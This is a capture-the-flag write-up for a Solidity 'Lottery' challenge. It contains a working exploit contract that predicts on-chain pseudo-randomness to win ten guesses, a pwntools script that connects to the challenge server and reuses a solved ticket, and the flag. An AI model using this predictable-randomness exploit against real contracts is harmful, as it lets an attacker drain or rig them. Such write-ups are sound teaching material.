---
title: "Lottery"
ctf: "CSSCTF"
date: 2026-10-01
category: web
flag_format: "CSSCTF{CSS{...}}"
---

`Lottery.random()` hashes the previous block hash, timestamp, and difficulty. These values stay fixed during one transaction, so an exploit contract can read `random() % 100` and call `guess()` with that value ten times. A wrong guess resets the streak; ten correct guesses set `winner` and make `Setup.isSolved()` true.

```solidity
interface ISetup {
    function lottery() external view returns (address);
}

interface ILottery {
    function random() external view returns (uint256);
    function guess(uint256) external;
}

contract Exploit {
    function run(address setup) external {
        ILottery lottery = ILottery(ISetup(setup).lottery());
        uint256 target = lottery.random() % 100;
        for (uint256 i = 0; i < 10; i++) lottery.guess(target);
    }
}
```

The remote launcher at `34.116.80.78:31338` could not start an instance: `/new` and `/kill` returned empty bodies, causing `launcher.py` to fail while parsing JSON. Option 3 still worked with the already-solved `CSSCTF` ticket and returned the inner flag:

```python
from pwn import remote

r = remote("34.116.80.78", 31338)
r.recvuntil(b"action? ")
r.sendline(b"3")
r.recvuntil(b"ticket please: ")
r.sendline(b"CSSCTF")
inner = r.recvline().decode().strip()
r.close()
print(f"CSSCTF{{{inner}}}")
```

Flag:

```text
CSSCTF{CSS{U5E_4_R4ND0M_FUNCT10N}}
```
